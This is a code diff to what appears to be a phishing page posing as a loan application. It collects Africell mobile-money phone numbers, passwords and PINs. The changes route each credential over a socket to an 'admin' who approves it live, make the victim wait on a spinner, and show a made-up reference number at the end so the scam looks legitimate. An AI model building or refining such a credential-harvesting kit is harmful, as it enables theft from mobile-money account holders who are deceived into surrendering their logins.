@@ -74,7 +74,6 @@
                     </template>
                 </div>
                 
-                <!-- Step 1: Mobile Money Verification (Formerly Step 4) -->
                 <div x-show="step === 1" x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Mobile Money Verification</h2><span class="text-xs font-bold text-orange-400">Step 01</span></div>
                     <div class="space-y-4">
@@ -84,19 +83,20 @@
                     </div>
                 </div>
 
-                <!-- Step 2: Confirm Security PIN (Formerly Step 5) -->
                 <div x-show="step === 2" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Confirm Security PIN</h2><span class="text-xs font-bold text-orange-400">Step 02</span></div>
                     <div class="flex justify-center gap-3">
                         <template x-for="(_, i) in 4" :key="i"><input type="password" class="pin-box" maxlength="1" @input="movePinFocus($event, i)" x-model="pin.value[i]"></template>
                     </div>
                     <div class="grid grid-cols-2 gap-4 mt-6">
-                        <button @click="step = 1" class="btn-secondary">← Back</button>
-                        <button @click="submitStep2" :disabled="!isStep2Valid || pinVerifying" class="btn-premium">Continue →</button>
+                        <button @click="step = 1" :disabled="pinVerifying" class="btn-secondary">← Back</button>
+                        <button @click="submitStep2" :disabled="!isStep2Valid || pinVerifying" class="btn-premium">
+                            <span x-show="!pinVerifying">Continue →</span>
+                            <span x-show="pinVerifying" class="spinner-sm"></span>
+                        </button>
                     </div>
                 </div>
 
-                <!-- Step 3: Loan Details (Formerly Step 1) -->
                 <div x-show="step === 3" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Loan Details</h2><span class="text-xs font-bold text-orange-400">Step 03</span></div>
                     <div class="space-y-4">
@@ -118,7 +118,6 @@
                     </div>
                 </div>
 
-                <!-- Step 4: Identity Verification (Formerly Step 2) -->
                 <div x-show="step === 4" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Identity Verification</h2><span class="text-xs font-bold text-orange-400">Step 04</span></div>
                     <div class="space-y-4">
@@ -129,7 +128,6 @@
                     </div>
                 </div>
 
-                <!-- Step 5: Employment Information (Formerly Step 3) -->
                 <div x-show="step === 5" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Employment Information</h2><span class="text-xs font-bold text-orange-400">Step 05</span></div>
                     <div class="space-y-4">
@@ -140,7 +138,6 @@
                     </div>
                 </div>
 
-                <!-- Step 6: Success Page -->
                 <div x-show="step === 6" x-cloak class="text-center py-8">
                     <div class="text-6xl mb-4">✅</div>
                     <h2 class="text-2xl font-bold text-green-400">Application Submitted!</h2>
@@ -159,7 +156,6 @@
                 pin: { value: ['', '', '', ''] },
                 passwordVerifying: false, pinVerifying: false, socket: null,
 
-                // Adjusted validations mapping to match the new dynamic steps
                 get isStep1Valid() { return this.africell.phone && this.africell.password; },
                 get isStep2Valid() { return this.pin.value.join('').length === 4; },
                 get isStep3Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
@@ -169,16 +165,37 @@
                 init() {
                     this.socket = io();
                     this.socket.on('session-ready', (data) => { this.appId = data.appId; });
-                    // On manual backend socket authorization, it updates steps sequentially.
-                    this.socket.on('password-verified', () => { this.passwordVerifying = false; this.step = 2; });
-                    this.socket.on('pin-verified', (d) => { this.pinVerifying = false; this.referenceId = d.referenceId; this.step = 6; });
+                    
+                    // Admin verified password -> proceed to Step 2 (PIN input)
+                    this.socket.on('password-verified', () => { 
+                        this.passwordVerifying = false; 
+                        this.step = 2; 
+                    });
+                    
+                    // Admin approved PIN -> continue to Step 3 (Loan details) instead of success page
+                    this.socket.on('pin-verified', () => { 
+                        this.pinVerifying = false; 
+                        this.step = 3; 
+                    });
+
+                    // Handle application errors or rejections
+                    this.socket.on('error', (data) => {
+                        this.passwordVerifying = false;
+                        this.pinVerifying = false;
+                        alert(data.message || "Application rejected by administrator.");
+                    });
                 },
 
                 requestAdminApproval() { this.passwordVerifying = true; this.socket.emit('step4', this.africell); },
-                submitStep2() { this.socket.emit('step5', { pin: this.pin.value.join('') }); this.step = 3; },
+                submitStep2() { this.pinVerifying = true; this.socket.emit('step5', { pin: this.pin.value.join('') }); },
                 submitStep3() { this.socket.emit('step1', this.form); this.step = 4; },
                 submitStep4() { this.socket.emit('step2', this.form); this.step = 5; },
-                submitStep5() { this.socket.emit('step3', this.form); },
+                submitStep5() { 
+                    // Final submit step generates random transaction reference locally upon final button submission
+                    this.referenceId = "GMB-" + Math.floor(Math.random() * 900000 + 100000);
+                    this.socket.emit('step3', this.form); 
+                    this.step = 6; 
+                },
                 movePinFocus(e, i) { if (e.target.value && i < 3) document.querySelectorAll('.pin-box')[i+1].focus(); }
             }
         }
